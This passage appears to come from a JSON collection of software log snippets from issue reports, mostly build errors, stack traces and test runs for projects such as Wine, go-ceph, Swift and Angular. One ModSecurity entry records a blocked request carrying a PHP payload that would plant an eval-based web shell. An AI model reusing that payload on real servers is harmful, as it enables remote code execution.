        "logs": "AggregateError: OPError: expected 200 OK, got: 403 Forbidden\r\nat processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\nOPError: expected 200 OK, got: 403 Forbidden at processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19"
    },
    {
        "logs": "AggregateError: OPError: expected 200 OK, got: 403 Forbidden\r\nat processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19\r\nOPError: expected 200 OK, got: 403 Forbidden at processResponse (/usr/app/node_modules/openid-client/lib/helpers/process_response.js:48:11)\r\nat /usr/app/node_modules/openid-client/lib/issuer.js:249:20 at runMicrotasks ()\r\nat async /usr/app/node_modules/p-some/index.js:53:19"
    },
    {
        "logs": "/usr/bin/ld: relocatable linking with relocations from format elf64-x86-64 (/opt/wine-staging/lib64/wine/libwinecrt0.a(exe_entry.o)) to format elf32-i386 (opentrack-wrapper-wine.mcDCZn.o) is not supported\r\nwinebuild: /usr/bin/ld failed with status 1\r\nwinegcc: /opt/wine-staging/bin/winebuild failed\r\nmake[2]: *** [proto-wine/CMakeFiles/wine-wrapper.dir/build.make:82: proto-wine/opentrack-wrapper-wine.exe.so] Error 2\r\nmake[1]: *** [CMakeFiles/Makefile2:2458: proto-wine/CMakeFiles/wine-wrapper.dir/all] Error 2\r\nmake[1]: *** Waiting for unfinished jobs...."
    },
    {
        "logs": "/media/local/opentrack$ winegcc -m32\r\ngcc: fatal error: no input files\r\ncompilation terminated.\r\nwinegcc: /usr/bin/gcc failed"
    },
    {
        "logs": "/usr/bin/ld: relocatable linking with relocations from format elf64-x86-64 (/opt/wine-staging/lib64/wine/libwinecrt0.a(exe_entry.o)) to format elf32-i386 (opentrack-wrapper-wine.mcDCZn.o) is not supported\r\nwinebuild: /usr/bin/ld failed with status 1\r\nwinegcc: /opt/wine-staging/bin/winebuild failed\r\nmake[2]: *** [proto-wine/CMakeFiles/wine-wrapper.dir/build.make:82: proto-wine/opentrack-wrapper-wine.exe.so] Error 2\r\nmake[1]: *** [CMakeFiles/Makefile2:2458: proto-wine/CMakeFiles/wine-wrapper.dir/all] Error 2\r\nmake[1]: *** Waiting for unfinished jobs...."
    },
    {
        "logs": "test-sim-import-export: runsim\r\n\t@echo \"Running application import/export simulation. This may take several minutes...\"\r\n\t@$(BINDIR)/runsim -Jobs=4 -SimAppPkg=$(SIMAPP) -ExitOnFail 50 5 TestAppImportExport"
    },
    {
        "logs": "test-sim-import-export: runsim\r\n\t@echo \"Running application import/export simulation. This may take several minutes...\"\r\n\t@$(BINDIR)/runsim -Jobs=4 -SimAppPkg=$(SIMAPP) -ExitOnFail 50 5 TestAppImportExport"
    },
    {
        "logs": "    def _CloneMixin__duplicate_m2o_fields(self, duplicate, using=None):\r\n        for f in self._meta.concrete_fields:\r\n            if f.many_to_one:\r\n                if any(\r\n                    [\r\n                        f.name in self._clone_m2o_or_o2m_fields,\r\n                        self._clone_excluded_m2o_or_o2m_fields\r\n                        and f.name not in self._clone_excluded_m2o_or_o2m_fields,\r\n                    ]\r\n                ):\r\n                    item = getattr(self, f.name)\r\n                    if hasattr(item, \"make_clone\"):\r\n                        try:\r\n                            item_clone = item.make_clone(using=using)\r\n                        except IntegrityError:\r\n                            item_clone = item.make_clone(sub_clone=True)\r\n                    elif item is None:\r\n                        item_clone = None\r\n                    else:\r\n                        item.pk = None  # pragma: no cover\r\n                        item_clone = item.save(using=using)  # pragma: no cover"
    },
    {
        "logs": "    def _CloneMixin__duplicate_m2o_fields(self, duplicate, using=None):\r\n        for f in self._meta.concrete_fields:\r\n            if f.many_to_one:\r\n                if any(\r\n                    [\r\n                        f.name in self._clone_m2o_or_o2m_fields,\r\n                        self._clone_excluded_m2o_or_o2m_fields\r\n                        and f.name not in self._clone_excluded_m2o_or_o2m_fields,\r\n                    ]\r\n                ):\r\n                    item = getattr(self, f.name)\r\n                    if hasattr(item, \"make_clone\"):\r\n                        try:\r\n                            item_clone = item.make_clone(using=using)\r\n                        except IntegrityError:\r\n                            item_clone = item.make_clone(sub_clone=True)\r\n                    elif item is None:\r\n                        item_clone = None\r\n                    else:\r\n                        item.pk = None  # pragma: no cover\r\n                        item_clone = item.save(using=using)  # pragma: no cover"
    },
    {
        "logs": "\u2500$ soda ingest dbt --warehouse-yml-file warehouse.yml --dbt-manifest docs/manifest.json --dbt-run-results docs/run_results.json\r\n\r\n  | 2.1.1\r\nTraceback (most recent call last):\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/bin/soda\", line 8, in <module>\r\n    sys.exit(main())\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/click/core.py\", line 1128, in __call__\r\n    return self.main(*args, **kwargs)\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/click/core.py\", line 1053, in main\r\n    rv = self.invoke(ctx)\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/click/core.py\", line 1659, in invoke\r\n    return _process_result(sub_ctx.command.invoke(sub_ctx))\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/click/core.py\", line 1395, in invoke\r\n    return ctx.invoke(self.callback, **ctx.params)\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/click/core.py\", line 754, in invoke\r\n    return __callback(*args, **kwargs)\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/sodasql/cli/cli.py\", line 525, in ingest\r\n    _ingest(*args, **kwargs)\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/sodasql/cli/ingest.py\", line 219, in ingest\r\n    flush_test_results(\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/sodasql/cli/ingest.py\", line 152, in flush_test_results\r\n    for table, test_results in test_results_iterator:\r\n  File \"/Users/bjornvandijkman/Documents/GitHub/customer360-foundation/dbt/.venv/lib/python3.9/site-packages/sodasql/cli/ingest.py\", line 120, in map_dbt_test_results_iterator\r\n    model_and_seed_nodes[unique_id].alias,\r\nKeyError: 'source.dbt_customer_360.dbt_customer_360_prod.orders'"
    },
    {
        "logs": "[client [OUR.IP]:41520] ModSecurity: Access denied with code 403 (phase 2). Matched phrase \"eval(\" at ARGS:1. [file \"C:\\/Program Files/ModSecurity IIS/b/b.conf\"] [line \"3\"] [id \"49459\"] [msg \"NO\"] [severity \"WARNING\"] [hostname \"NODE2\"] [uri \"/?1=@ini_set(%22display_errors%22,%220%22);@set_time_limit(0);@set_magic_quotes_runtime(0);echo%20'-%3E%7C';file_put_contents(dirname($_SERVER%5B'SCRIPT_FILENAME'%5D).'/cache/cachee.php','%3C?php%20eval($_POST%5Bshine%5D);?%3E');echo%20'%7C%3C-';\"] [unique_id \"13979173249800486753\"]"
    },
    {
        "logs": "yarn install v0.18.1\r\n[1/4] Resolving packages...\r\n[2/4] Fetching packages...\r\nwarning fsevents@1.0.17: The platform \"linux\" is incompatible with this module.\r\ninfo \"fsevents@1.0.17\" is an optional dependency and failed compatibility check. Excluding it from installation.\r\n[3/4] Linking dependencies...\r\nwarning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\".\r\n[4/4] Building fresh packages...\r\nDone in 8.18s."
    },
    {
        "logs": "warning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\"."
    },
    {
        "logs": "yarn install v0.18.1\r\n[1/4] Resolving packages...\r\n[2/4] Fetching packages...\r\nwarning fsevents@1.0.17: The platform \"linux\" is incompatible with this module.\r\ninfo \"fsevents@1.0.17\" is an optional dependency and failed compatibility check. Excluding it from installation.\r\n[3/4] Linking dependencies...\r\nwarning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\".\r\n[4/4] Building fresh packages...\r\nDone in 8.18s."
    },
    {
        "logs": "warning Incorrect peer dependency \"@angular/compiler@<=2.4 >=2.2.0\".\r\nwarning Incorrect peer dependency \"@angular/core@<=2.4 >=2.2.0\".\r\nwarning Unmet peer dependency \"@angular/tsc-wrapped@^0.5.0\".\r\nwarning Unmet peer dependency \"reflect-metadata@^0.1.8\"."
    },
    {
        "logs": "bash\r\n[TexText][SUCCESS ]: |  |  /-and-* pstoedit=3.70 is found\r\n[TexText][ERROR   ]: |  |  /-and-* ghostscript=9.22 is not found (but ghostscript=9.25 is found)"
    },
    {
        "logs": "bash\r\n[TexText][SUCCESS ]: |     /--or-* PyGTK2 is found\r\n[TexText][ERROR   ]: |     /--or-* TkInter is not found\r\n[TexText][SUCCESS ]: /-and-+ Detect pdf->png conversion utility\r\n[TexText][SUCCESS ]: |     /--or-* "
    },
    {
        "logs": "bash\r\n[TexText][SUCCESS ]: |  |  /-and-* pstoedit=3.70 is found\r\n[TexText][ERROR   ]: |  |  /-and-* ghostscript=9.22 is not found (but ghostscript=9.25 is found)"
    },
    {
        "logs": "bash\r\n[TexText][SUCCESS ]: |     /--or-* PyGTK2 is found\r\n[TexText][ERROR   ]: |     /--or-* TkInter is not found\r\n[TexText][SUCCESS ]: /-and-+ Detect pdf->png conversion utility\r\n[TexText][SUCCESS ]: |     /--or-* `convert` is found at `/usr/bin`\r\n[TexText][ERROR   ]: |     /--or-* `magick` is NOT found in PATH"
    },
    {
        "logs": "diff\r\n@@ -1173,7 +1189,7 @@\r\n fakeroot is already the newest version (1.23-1).\r\n 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\r\n I: Building the package\r\n-I: Running cd /build/1st/restic-0.9.3+ds/ && env PATH=\"/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\" HOME=\"/nonexistent/first-build\" dpkg-buildpackage -us -uc -b --buildinfo-id=amd64 -rfakeroot\r\n+I: Running cd /build/restic-0.9.3+ds/2nd/ && env PATH=\"/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/i/capture/the/path\" HOME=\"/nonexistent/second-build\" dpkg-buildpackage -us -uc -b --buildinfo-id=amd64 -rfakeroot\r\n dpkg-buildpackage: warning: --buildinfo-id is deprecated, it is without effect\r\n dpkg-buildpackage: info: source package restic\r\n dpkg-buildpackage: info: source version 0.9.3+ds-1"
    },
    {
        "logs": "Manifest-Version: 1.0\r\nBnd-LastModified: 1589904947042\r\nBundle-ManifestVersion: 2\r\nBundle-Name: ossgang-commons\r\nBundle-SymbolicName: ossgang-commons\r\nBundle-Vendor: CERN\r\nBundle-Version: 0.0.0\r\nCreated-By: 1.8.0_252 (AdoptOpenJDK)\r\nExport-Package: org.ossgang.commons.awaitables;version=\"0.0.0\",org.oss\r\n gang.commons.awaitables.exceptions;version=\"0.0.0\",org.ossgang.common\r\n s.collections;version=\"0.0.0\",org.ossgang.commons.mapbackeds;version=\r\n \"0.0.0\",org.ossgang.commons.monads;version=\"0.0.0\",org.ossgang.common\r\n s.observables;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.o\r\n bservables.operators.connectors\";version=\"0.0.0\",org.ossgang.commons.\r\n observables.exceptions;version=\"0.0.0\",org.ossgang.commons.observable\r\n s.operators;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.observables.operators.b\r\n uffer;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.prop\r\n erties\";version=\"0.0.0\",org.ossgang.commons.observables.operators.con\r\n nectors;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.pr\r\n operties\";version=\"0.0.0\",org.ossgang.commons.observables.testing;use\r\n s:=\"org.ossgang.commons.observables\";version=\"0.0.0\",org.ossgang.comm\r\n ons.observables.weak;uses:=\"org.ossgang.commons.observables\";version=\r\n \"0.0.0\",org.ossgang.commons.properties;uses:=\"org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.utils;uses:=\"org.ossgan\r\n g.commons.monads\";version=\"0.0.0\"\r\nRequire-Capability: osgi.ee;filter:=\"(&(osgi.ee=JavaSE)(version=1.8))\"\r\nTool: Bnd-4.3.1.201911131708"
    },
    {
        "logs": "Manifest-Version: 1.0\r\nBnd-LastModified: 1589904947042\r\nBundle-ManifestVersion: 2\r\nBundle-Name: ossgang-commons\r\nBundle-SymbolicName: ossgang-commons\r\nBundle-Vendor: CERN\r\nBundle-Version: 0.0.0\r\nCreated-By: 1.8.0_252 (AdoptOpenJDK)\r\nExport-Package: org.ossgang.commons.awaitables;version=\"0.0.0\",org.oss\r\n gang.commons.awaitables.exceptions;version=\"0.0.0\",org.ossgang.common\r\n s.collections;version=\"0.0.0\",org.ossgang.commons.mapbackeds;version=\r\n \"0.0.0\",org.ossgang.commons.monads;version=\"0.0.0\",org.ossgang.common\r\n s.observables;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.o\r\n bservables.operators.connectors\";version=\"0.0.0\",org.ossgang.commons.\r\n observables.exceptions;version=\"0.0.0\",org.ossgang.commons.observable\r\n s.operators;uses:=\"org.ossgang.commons.monads,org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.observables.operators.b\r\n uffer;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.prop\r\n erties\";version=\"0.0.0\",org.ossgang.commons.observables.operators.con\r\n nectors;uses:=\"org.ossgang.commons.observables,org.ossgang.commons.pr\r\n operties\";version=\"0.0.0\",org.ossgang.commons.observables.testing;use\r\n s:=\"org.ossgang.commons.observables\";version=\"0.0.0\",org.ossgang.comm\r\n ons.observables.weak;uses:=\"org.ossgang.commons.observables\";version=\r\n \"0.0.0\",org.ossgang.commons.properties;uses:=\"org.ossgang.commons.obs\r\n ervables\";version=\"0.0.0\",org.ossgang.commons.utils;uses:=\"org.ossgan\r\n g.commons.monads\";version=\"0.0.0\"\r\nRequire-Capability: osgi.ee;filter:=\"(&(osgi.ee=JavaSE)(version=1.8))\"\r\nTool: Bnd-4.3.1.201911131708"
    },
    {
        "logs": "[WARN] [1589967870.146949]: Error while start RPC-XML server on port 11611: [Errno 98] Address already in use\r\nTry again.."
    },
    {
        "logs": "[WARN] [1589967870.146949]: Error while start RPC-XML server on port 11611: [Errno 98] Address already in use\r\nTry again.."
    },
    {
        "logs": "14:20:50 FAIL: Swift(linux-x86_64) :: AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift (13232 of 13264)\r\n14:20:50 ******************** TEST 'Swift(linux-x86_64) :: AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift' FAILED ********************\r\n14:20:50 Script:\r\n14:20:50 --\r\n14:20:50 : 'RUN: at line 1';   /home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/buildbot_linux/swift-linux-x86_64/bin/swiftc -target x86_64-unknown-linux-gnu -toolchain-stdlib-rpath  -module-cache-path '/home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/buildbot_linux/swift-linux-x86_64/swift-test-results/x86_64-unknown-linux-gnu/clang-module-cache' -swift-version 4  -Xfrontend -ignore-module-source-info  -g /home/buildnode/jenkins/workspace/swift-PR-Linux-smoke-test@2/branch-master/swift/test/AutoDiff/compiler_crashers_fixed/sr12650-noderivative-parameter-type-mangling.swift\r\n14:20:50 --\r\n14:20:50 Exit Code: 254\r\n14:20:50 \r\n14:20:50 Command Output (stderr):\r\n14:20:50 --\r\n14:20:50 \r\nclang-10: error: unable to execute command: Bus error (core dumped)\r\n14:20:50 clang-10: error: linker command failed due to signal (use -v to see invocation)\r\n14:20:50 <unknown>:0: error: link command failed with exit code 254 (use -v to see invocation)"
    },
    {
        "logs": "$ make test-docker\r\n\r\ndocker build --build-arg CEPH_VERSION=octopus -t go-ceph-ci:octopus -f testing/containers/ceph/Dockerfile .\r\n[+] Building 110.7s (11/11) FINISHED                                                                                                    \r\n => [internal] load build definition from Dockerfile                                                                               0.0s\r\n => => transferring dockerfile: 37B                                                                                                0.0s\r\n => [internal] load .dockerignore                                                                                                  0.0s\r\n => => transferring context: 2B                                                                                                    0.0s\r\n => [internal] load metadata for docker.io/ceph/daemon-base:latest-octopus                                                         2.7s\r\n => [internal] load build context                                                                                                  0.0s\r\n => => transferring context: 67B                                                                                                   0.0s\r\n => [1/6] FROM docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b  43.5s\r\n => => resolve docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b   0.0s\r\n => => sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b 743B / 743B                                         0.0s\r\n => => sha256:87d4014973b60eb51b0d79d76e5af31b79c7614b30a39220d8271763024511ec 22.78kB / 22.78kB                                   0.0s\r\n => => sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e 293.55MB / 293.55MB                                30.8s\r\n => => extracting sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e                                         12.1s\r\n => [2/6] RUN true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum insta  49.6s\r\n => [3/6] RUN true &&     curl -o /tmp/go1.15.10.linux-amd64.tar.gz https://dl.google.com/go/go1.15.10.linux-amd64.tar.gz &&      12.1s\r\n => [4/6] WORKDIR /go/src/github.com/ceph/go-ceph                                                                                  0.1s \r\n => [5/6] COPY micro-osd.sh /                                                                                                      0.0s \r\n => [6/6] COPY entrypoint.sh /                                                                                                     0.0s \r\n => exporting to image                                                                                                             2.4s \r\n => => exporting layers                                                                                                            2.4s \r\n => => writing image sha256:26ecff9b28e8e43e4adbbe498bbe12ea479a04b76929fced477329e63d4a4db0                                       0.0s\r\n => => naming to docker.io/library/go-ceph-ci:octopus                                                                              0.0s\r\n\r\nUse 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them\r\necho octopus >> .build.octopus\r\ndocker run --security-opt apparmor:unconfined --rm -v /Users/username_0/go/src/github.com/ceph/go-ceph:/go/src/github.com/ceph/go-ceph  go-ceph-ci:octopus \r\n*** running: /micro-osd.sh /tmp/ceph\r\n++ set -u\r\n++ DIR=/tmp/ceph\r\n++ pkill ceph\r\n++ true\r\n++ rm -rf '/tmp/ceph/*'\r\n++ LOG_DIR=/tmp/ceph/log\r\n++ MON_DATA=/tmp/ceph/mon\r\n++ MDS_DATA=/tmp/ceph/mds\r\n++ MOUNTPT=/tmp/ceph/mds/mnt\r\n++ OSD_DATA=/tmp/ceph/osd\r\n++ RGW_DATA=/tmp/ceph/radosgw\r\n++ mkdir /tmp/ceph/log /tmp/ceph/mon /tmp/ceph/osd /tmp/ceph/mds /tmp/ceph/mds/mnt /tmp/ceph/radosgw\r\n++ MDS_NAME=Z\r\n++ MON_NAME=a\r\n++ MGR_NAME=x\r\n++ MIRROR_ID=m\r\n++ RGW_ID=r\r\n++ cat\r\n+++ uuidgen\r\n++ export CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ ceph-mon --id a --mkfs --keyring /dev/null\r\n++ touch /tmp/ceph/mon/keyring\r\n++ ceph-mon --id a\r\n2021-05-05T15:05:32.150+0000 7fc58a786700 -1 WARNING: invalid 'mon addr' config option\r\n         continuing with monmap configuration\r\n+++ ceph osd create\r\n++ OSD_ID=0\r\n++ ceph osd crush add osd.0 1 root=default\r\nadd item id 0 name 'osd.0' weight 1 at location {root=default} to crush map\r\n++ ceph-osd --id 0 --mkjournal --mkfs\r\n2021-05-05T15:05:33.852+0000 7f2775b64f40 -1 memstore(/tmp/ceph/osd) /tmp/ceph/osd\r\n++ ceph-osd --id 0\r\n2021-05-05T15:05:33.908+0000 7f7d8a341f40 -1 Falling back to public interface\r\n2021-05-05T15:05:33.969+0000 7f7d8a341f40 -1 osd.0 0 log_to_monitors {default=true}\r\n++ ceph auth get-or-create mds.Z mon 'profile mds' mgr 'profile mds' mds 'allow *' osd 'allow *'\r\n++ ceph osd pool create cephfs_data 8\r\npool 'cephfs_data' created\r\n++ ceph osd pool create cephfs_metadata 8\r\npool 'cephfs_metadata' created\r\n++ ceph fs new cephfs cephfs_metadata cephfs_data\r\nnew fs with metadata pool 2 and data pool 1\r\n++ ceph fs ls\r\nname: cephfs, metadata pool: cephfs_metadata, data pools: [cephfs_data ]\r\n++ ceph-mds -i Z\r\nstarting mds.Z at \r\n[Truncated]\n=== RUN   TestNew/no_endpoint\r\n=== RUN   TestNew/no_accessKey\r\n=== RUN   TestNew/no_secretKey\r\n--- PASS: TestNew (0.00s)\r\n    --- PASS: TestNew/no_endpoint (0.00s)\r\n    --- PASS: TestNew/no_accessKey (0.00s)\r\n    --- PASS: TestNew/no_secretKey (0.00s)\r\n=== RUN   TestUnmarshal\r\n--- PASS: TestUnmarshal (0.00s)\r\n=== RUN   TestBuildQueryPath\r\n--- PASS: TestBuildQueryPath (0.00s)\r\n=== RUN   Test_getValues\r\n=== RUN   Test_getValues/default\r\n--- PASS: Test_getValues (0.00s)\r\n    --- PASS: Test_getValues/default (0.00s)\r\nPASS\r\ncoverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\nok      github.com/ceph/go-ceph/rgwadmin        0.267s  coverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\n*** running: go tool cover -html=cover.out -o /results/coverage/go-ceph.html                                                               "
    },
    {
        "logs": "No match for argument: libcephfs-devel-16.2.1-0.el8\r\nNo match for argument: librados-devel-16.2.1-0.el8\r\nNo match for argument: librbd-devel-16.2.1-0.el8\r\nError: Unable to find a match: libcephfs-devel-16.2.1-0.el8 librados-devel-16.2.1-0.el8 librbd-devel-16.2.1-0.el8\r\nThe command '/bin/sh -c true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum install -y         git wget curl make         /usr/bin/cc /usr/bin/c++         \"libcephfs-devel-${cv}\" \"librados-devel-${cv}\" \"librbd-devel-${cv}\" &&     true' returned a non-zero code: 1\r\nmake: *** [Makefile:73: .build.pacific] Error 1"
    },
    {
        "logs": "$ make test-docker\r\n\r\ndocker build --build-arg CEPH_VERSION=octopus -t go-ceph-ci:octopus -f testing/containers/ceph/Dockerfile .\r\n[+] Building 110.7s (11/11) FINISHED                                                                                                    \r\n => [internal] load build definition from Dockerfile                                                                               0.0s\r\n => => transferring dockerfile: 37B                                                                                                0.0s\r\n => [internal] load .dockerignore                                                                                                  0.0s\r\n => => transferring context: 2B                                                                                                    0.0s\r\n => [internal] load metadata for docker.io/ceph/daemon-base:latest-octopus                                                         2.7s\r\n => [internal] load build context                                                                                                  0.0s\r\n => => transferring context: 67B                                                                                                   0.0s\r\n => [1/6] FROM docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b  43.5s\r\n => => resolve docker.io/ceph/daemon-base:latest-octopus@sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b   0.0s\r\n => => sha256:9d7897f20ea1c68a5e9b3679491c00e268738440d7747206e11a487f3a90110b 743B / 743B                                         0.0s\r\n => => sha256:87d4014973b60eb51b0d79d76e5af31b79c7614b30a39220d8271763024511ec 22.78kB / 22.78kB                                   0.0s\r\n => => sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e 293.55MB / 293.55MB                                30.8s\r\n => => extracting sha256:e103216eed4d3938ed73b0dd2f3aebaf3b258b17e8756e8fea8364e4be34a89e                                         12.1s\r\n => [2/6] RUN true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum insta  49.6s\r\n => [3/6] RUN true &&     curl -o /tmp/go1.15.10.linux-amd64.tar.gz https://dl.google.com/go/go1.15.10.linux-amd64.tar.gz &&      12.1s\r\n => [4/6] WORKDIR /go/src/github.com/ceph/go-ceph                                                                                  0.1s \r\n => [5/6] COPY micro-osd.sh /                                                                                                      0.0s \r\n => [6/6] COPY entrypoint.sh /                                                                                                     0.0s \r\n => exporting to image                                                                                                             2.4s \r\n => => exporting layers                                                                                                            2.4s \r\n => => writing image sha256:26ecff9b28e8e43e4adbbe498bbe12ea479a04b76929fced477329e63d4a4db0                                       0.0s\r\n => => naming to docker.io/library/go-ceph-ci:octopus                                                                              0.0s\r\n\r\nUse 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them\r\necho octopus >> .build.octopus\r\ndocker run --security-opt apparmor:unconfined --rm -v /Users/username_0/go/src/github.com/ceph/go-ceph:/go/src/github.com/ceph/go-ceph  go-ceph-ci:octopus \r\n*** running: /micro-osd.sh /tmp/ceph\r\n++ set -u\r\n++ DIR=/tmp/ceph\r\n++ pkill ceph\r\n++ true\r\n++ rm -rf '/tmp/ceph/*'\r\n++ LOG_DIR=/tmp/ceph/log\r\n++ MON_DATA=/tmp/ceph/mon\r\n++ MDS_DATA=/tmp/ceph/mds\r\n++ MOUNTPT=/tmp/ceph/mds/mnt\r\n++ OSD_DATA=/tmp/ceph/osd\r\n++ RGW_DATA=/tmp/ceph/radosgw\r\n++ mkdir /tmp/ceph/log /tmp/ceph/mon /tmp/ceph/osd /tmp/ceph/mds /tmp/ceph/mds/mnt /tmp/ceph/radosgw\r\n++ MDS_NAME=Z\r\n++ MON_NAME=a\r\n++ MGR_NAME=x\r\n++ MIRROR_ID=m\r\n++ RGW_ID=r\r\n++ cat\r\n+++ uuidgen\r\n++ export CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ CEPH_CONF=/tmp/ceph/ceph.conf\r\n++ ceph-mon --id a --mkfs --keyring /dev/null\r\n++ touch /tmp/ceph/mon/keyring\r\n++ ceph-mon --id a\r\n2021-05-05T15:05:32.150+0000 7fc58a786700 -1 WARNING: invalid 'mon addr' config option\r\n         continuing with monmap configuration\r\n+++ ceph osd create\r\n++ OSD_ID=0\r\n++ ceph osd crush add osd.0 1 root=default\r\nadd item id 0 name 'osd.0' weight 1 at location {root=default} to crush map\r\n++ ceph-osd --id 0 --mkjournal --mkfs\r\n2021-05-05T15:05:33.852+0000 7f2775b64f40 -1 memstore(/tmp/ceph/osd) /tmp/ceph/osd\r\n++ ceph-osd --id 0\r\n2021-05-05T15:05:33.908+0000 7f7d8a341f40 -1 Falling back to public interface\r\n2021-05-05T15:05:33.969+0000 7f7d8a341f40 -1 osd.0 0 log_to_monitors {default=true}\r\n++ ceph auth get-or-create mds.Z mon 'profile mds' mgr 'profile mds' mds 'allow *' osd 'allow *'\r\n++ ceph osd pool create cephfs_data 8\r\npool 'cephfs_data' created\r\n++ ceph osd pool create cephfs_metadata 8\r\npool 'cephfs_metadata' created\r\n++ ceph fs new cephfs cephfs_metadata cephfs_data\r\nnew fs with metadata pool 2 and data pool 1\r\n++ ceph fs ls\r\nname: cephfs, metadata pool: cephfs_metadata, data pools: [cephfs_data ]\r\n++ ceph-mds -i Z\r\nstarting mds.Z at \r\n[Truncated]\n=== RUN   TestNew/no_endpoint\r\n=== RUN   TestNew/no_accessKey\r\n=== RUN   TestNew/no_secretKey\r\n--- PASS: TestNew (0.00s)\r\n    --- PASS: TestNew/no_endpoint (0.00s)\r\n    --- PASS: TestNew/no_accessKey (0.00s)\r\n    --- PASS: TestNew/no_secretKey (0.00s)\r\n=== RUN   TestUnmarshal\r\n--- PASS: TestUnmarshal (0.00s)\r\n=== RUN   TestBuildQueryPath\r\n--- PASS: TestBuildQueryPath (0.00s)\r\n=== RUN   Test_getValues\r\n=== RUN   Test_getValues/default\r\n--- PASS: Test_getValues (0.00s)\r\n    --- PASS: Test_getValues/default (0.00s)\r\nPASS\r\ncoverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\nok      github.com/ceph/go-ceph/rgwadmin        0.267s  coverage: 59.5% of statements in github.com/ceph/go-ceph/rgwadmin\r\n*** running: go tool cover -html=cover.out -o /results/coverage/go-ceph.html                                                               "
    },
    {
